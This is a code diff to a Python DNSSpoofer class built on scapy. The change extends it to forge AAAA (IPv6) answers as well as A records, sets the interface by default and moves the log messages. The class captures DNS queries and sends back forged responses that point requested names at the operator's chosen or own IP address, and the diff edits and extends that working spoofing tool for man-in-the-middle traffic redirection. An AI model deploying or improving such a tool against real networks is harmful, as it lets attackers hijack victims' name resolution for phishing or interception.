@@ -2,18 +2,16 @@ from scapy.all import *
 
 class DNSSpoofer:
 
-    def __init__(self, interface: str, new_dns_ip = ''):
+    def __init__(self, interface: str = conf.iface, new_dns_ip: str = '', new_dns_ip6: str = ''):
         self.interface = interface
-
-        if new_dns_ip:
-            self.new_dns_ip = new_dns_ip
-        else:
-            self.new_dns_ip = get_if_addr(interface)
+        self.new_dns_ip = new_dns_ip if new_dns_ip else get_if_addr(interface)
+        self.new_dns_ip6 = new_dns_ip6 if new_dns_ip6 else get_if_addr6(interface)
     
     def isSupportedType(self, id: int) -> bool:
-        supported_types = [1]
-
-        return id in supported_types
+        return (
+            (id == 1 and self.new_dns_ip) or    # A
+            (id == 28 and self.new_dns_ip6)     # AAAA
+        )
 
     def recordTypeIdToName(self, id: int) -> str:
         """
@@ -50,6 +48,12 @@ class DNSSpoofer:
         if recordType == 1:
             # type: A
             res_pkt /= DNS(id=req_pkt[DNS].id, an=DNSRR(rrname=name, type=recordType, ttl=30, rdata=self.new_dns_ip))
+            print(f'Sending back response to {req_pkt[IP].src} with {self.recordTypeIdToName(recordType)} record: {self.new_dns_ip}')
+        elif recordType == 28:
+            # type: AAAA
+            res_pkt /= DNS(id=req_pkt[DNS].id, an=DNSRR(rrname=name, type=recordType, ttl=30, rdata=self.new_dns_ip6))
+            print(f'Sending back response to {req_pkt[IP].src} with {self.recordTypeIdToName(recordType)} record: {self.new_dns_ip6}')
+
 
         return res_pkt
 
@@ -64,7 +68,6 @@ class DNSSpoofer:
                 if self.isSupportedType(recordType):
                     res_pkt = self.get_spoof_packet(pkt, name, recordType)
                     send(res_pkt, iface=self.interface, verbose=False)
-                    print(f'Sent back response to {pkt[IP].src} with {self.recordTypeIdToName(recordType)} record: {self.new_dns_ip}')
                 else:
                     print('Type not supported, ignoring...')
     
